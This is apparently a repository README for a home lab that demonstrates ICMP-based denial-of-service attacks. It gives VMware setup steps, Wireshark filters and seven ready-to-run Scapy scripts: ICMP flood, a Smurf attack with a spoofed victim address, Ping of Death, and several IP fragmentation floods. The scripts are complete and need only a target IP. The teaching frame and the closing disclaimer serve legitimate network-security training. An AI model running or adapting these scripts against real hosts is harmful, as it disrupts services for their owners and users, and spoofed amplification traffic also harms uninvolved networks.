# ICMP-based DDoS Attack Demonstration

This repository contains Python scripts and step-by-step explanations to simulate various ICMP-based DDoS attacks. Each script demonstrates how attackers can exploit ICMP protocols to disrupt network services.

---

## Prerequisites

Install **Scapy**:
```bash
pip install scapy
```

---

## Lab Setup Instructions (VMware on macOS)

### Recommended Environment:
Use VMware Fusion with Ubuntu Server or Metasploitable2 VM.

#### VMware Fusion Setup
1. [Download and install VMware Fusion](https://customerconnect.vmware.com/downloads/#all_products).
2. Create a new VM:
    - Download [Ubuntu Server LTS](https://ubuntu.com/download/server) or [Metasploitable2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/).
    - Set network mode to **Host-Only Networking** for isolation.

#### Obtain VM IP Address
Run the following command on your VM:
```bash
ip addr
```
Use this IP in the attack scripts.

---

## Attack Scripts and Explanations

Each attack is explained with context and how it impacts the target device or network.

### 1. ICMP Flood

An ICMP flood involves sending an overwhelming number of ICMP echo requests (pings) rapidly, which can saturate network bandwidth or exhaust CPU resources.

#### Follow Along:
- Run Wireshark on your host machine with the filter `icmp`.
- Execute the script below and observe the rapid packet flow.

```python
# ICMP Flood Attack Script
from scapy.all import IP, ICMP, send

def icmp_flood(target_ip, packet_count=1000):
    packet = IP(dst=target_ip)/ICMP()
    send(packet, count=packet_count, inter=0.001)

# icmp_flood("TARGET_IP", 2000)
```

### 2. Smurf Attack

The Smurf attack exploits ICMP by spoofing a victim's IP address and sending packets to the broadcast address, resulting in amplified traffic returning to the victim.

#### Follow Along:
- Use Wireshark with the filter `icmp`.
- Notice packets spoofing the victim's IP.

```python
# Smurf Attack Script
from scapy.all import IP, ICMP, send

def smurf_attack(broadcast_ip, spoofed_src_ip, packet_count=500):
    packet = IP(src=spoofed_src_ip, dst=broadcast_ip)/ICMP()
    send(packet, count=packet_count, inter=0.01)

# smurf_attack("BROADCAST_IP", "SPOOFED_IP", 1000)
```

### 3. Ping of Death

An oversized ICMP packet (Ping of Death) targets older or unpatched systems causing crashes or instability due to buffer overflow.

#### Follow Along:
- Wireshark filter: `(icmp) && (frame.len > 1500)`.
- Observe the oversized packet.

```python
# Ping of Death Script
from scapy.all import IP, ICMP, send, Raw

def ping_of_death(target_ip):
    payload = b'X' * 65500
    packet = IP(dst=target_ip)/ICMP()/Raw(load=payload)
    send(packet)

# ping_of_death("TARGET_IP")
```

### 4. Fragmentation Flood

Rapidly sending fragmented packets exhausts the reassembly resources on the targeted system, leading to resource exhaustion and performance degradation.

#### Follow Along:
- Use Wireshark filter: `ip.flags.mf==1 || ip.frag_offset>0`.
- Notice how quickly fragments flood your target.

```python
# Fragmentation Flood Script
from scapy.all import IP, ICMP, send, fragment, Raw

def fragmentation_flood(target_ip, packet_count=500):
    payload = b'X' * 4000
    packet = IP(dst=target_ip)/ICMP()/Raw(load=payload)
    fragments = fragment(packet, fragsize=8)
    for _ in range(packet_count):
        send(fragments, inter=0.001)

# fragmentation_flood("TARGET_IP", 100)
```

### 5. Overlapping Fragments

Overlapping fragments confuse reassembly algorithms, potentially causing resource exhaustion or incorrect packet reassembly.

#### Follow Along:
- Observe overlapping fragments in Wireshark (`ip.flags.mf==1 || ip.frag_offset>0`).
- Notice reassembly issues.

```python
# Overlapping Fragments Script
from scapy.all import IP, ICMP, send, Raw

def overlapping_fragments(target_ip):
    payload = b'X' * 48
    packet1 = IP(dst=target_ip, id=12345, flags="MF", frag=0)/ICMP()/Raw(load=payload[:24])
    packet2 = IP(dst=target_ip, id=12345, flags=0, frag=2)/Raw(load=payload[16:])
    send([packet1, packet2])

# overlapping_fragments("TARGET_IP")
```

### 6. Reassembly Queue Overflow

Sending numerous fragmented packets with unique IDs quickly exhausts reassembly resources, effectively causing denial of service.

#### Follow Along:
- Observe resources being consumed via Wireshark.

```python
# Reassembly Queue Overflow Script
from scapy.all import IP, ICMP, send, fragment, Raw
import random

def reassembly_overflow(target_ip, packet_count=500):
    payload = b'X' * 4000
    for _ in range(packet_count):
        id = random.randint(1000, 65000)
        packet = IP(dst=target_ip, id=id)/ICMP()/Raw(load=payload)
        fragments = fragment(packet, fragsize=8)
        send(fragments, inter=0.001)

# reassembly_overflow("TARGET_IP", 200)
```

### 7. CPU Spike via Fragmentation

Rapid sending of tiny fragments can dramatically spike CPU usage on devices responsible for packet reassembly, leading to degraded network performance.

#### Follow Along:
- Monitor the CPU spike in the VM using resource monitoring tools (e.g., `top`, `htop`).

```python
# CPU Spike via Fragmentation Script
from scapy.all import IP, ICMP, send, fragment, Raw

def cpu_spike(target_ip, packet_count=500):
    payload = b'X' * 2000
    packet = IP(dst=target_ip)/ICMP()/Raw(load=payload)
    fragments = fragment(packet, fragsize=8)
    for _ in range(packet_count):
        send(fragments, inter=0.0001)

# cpu_spike("TARGET_IP", 100)
```

---

## Wireshark Capture Filters
- ICMP Traffic: `icmp`
- Fragmentation Traffic: `ip.flags.mf==1 || ip.frag_offset>0`
- Oversized ICMP Packets: `(icmp) && (frame.len > 1500)`

---

## Disclaimer

These scripts are provided solely for educational purposes. Execute them responsibly within a controlled and authorized environment.
